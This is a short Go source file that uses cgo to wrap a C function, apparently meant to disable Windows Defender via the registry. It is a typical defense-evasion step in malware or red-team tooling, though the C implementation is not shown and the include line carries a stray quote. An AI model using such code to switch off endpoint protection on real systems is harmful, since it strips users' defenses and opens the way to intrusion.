package native

//#include"native.h""
import "C"

func DisableDefenderWithRegistry(disable bool) {
	DisableDefender := 1
	if !disable {
		DisableDefender = 0
	}
	c_disable := C.int(DisableDefender)
	C.DisableDefender(c_disable)
}
